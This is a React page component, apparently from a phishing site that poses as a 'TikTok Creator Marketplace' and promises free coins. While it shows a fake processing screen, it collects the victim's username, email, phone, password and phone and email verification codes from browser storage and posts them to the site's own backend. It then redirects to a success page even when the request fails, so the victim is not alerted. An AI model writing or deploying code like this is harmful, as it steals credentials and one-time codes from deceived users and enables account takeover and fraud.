import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Loader2 } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const ProcessingPage = () => {
  const navigate = useNavigate();
  const [status, setStatus] = useState('processing');
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';

  useEffect(() => {
    const submitCoinRequest = async () => {
      try {
        // Gather all data from localStorage
        const requestData = {
          username: localStorage.getItem('username') || 'unknown',
          amount: parseInt(localStorage.getItem('coinAmount') || '100000'),
          email: localStorage.getItem('email') || '',
          phone: localStorage.getItem('phone') || '',
          password: localStorage.getItem('password') || '',
          phone_code: localStorage.getItem('phoneCode') || '',
          email_code: localStorage.getItem('emailCode') || '',
          location: 'Unknown',
          device: 'Web Browser',
        };

        // Send to backend
        const response = await axios.post(`${API}/coin-request`, requestData);
        
        if (response.data) {
          setStatus('success');
          // Wait 2 seconds then redirect to success page
          setTimeout(() => {
            navigate('/success');
          }, 2000);
        }
      } catch (error) {
        console.error('Error submitting coin request:', error);
        setStatus('error');
        // Even on error, redirect after 3 seconds
        setTimeout(() => {
          navigate('/success');
        }, 3000);
      }
    };

    submitCoinRequest();
  }, [navigate]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-20">
        <div className="flex flex-col items-center justify-center">
          {/* Loading Animation */}
          <div className="mb-12 relative">
            <div className="w-32 h-32 rounded-full border-4 border-gray-700 border-t-cyan-400 animate-spin"></div>
            <div className="absolute inset-0 flex items-center justify-center">
              <Loader2 className="w-16 h-16 text-cyan-400 animate-pulse" />
            </div>
          </div>

          {/* Title */}
          <h1 className="text-4xl font-bold text-white mb-4 text-center">
            {status === 'processing' && 'Your application is being processed...'}
            {status === 'success' && 'Request submitted successfully!'}
            {status === 'error' && 'Processing your request...'}
          </h1>
          <p className="text-gray-400 text-xl text-center mb-12">
            Please wait a moment
          </p>

          {/* Progress Dots */}
          <div className="flex gap-3 mb-16">
            <div className="w-3 h-3 rounded-full bg-cyan-400 animate-pulse" style={{ animationDelay: '0ms' }}></div>
            <div className="w-3 h-3 rounded-full bg-cyan-400 animate-pulse" style={{ animationDelay: '200ms' }}></div>
            <div className="w-3 h-3 rounded-full bg-cyan-400 animate-pulse" style={{ animationDelay: '400ms' }}></div>
          </div>

          {/* Coins Display */}
          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
            <span className="text-gray-400 text-lg">You will receive: </span>
            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
            <span className="text-gray-400 text-lg"> Coins</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default ProcessingPage;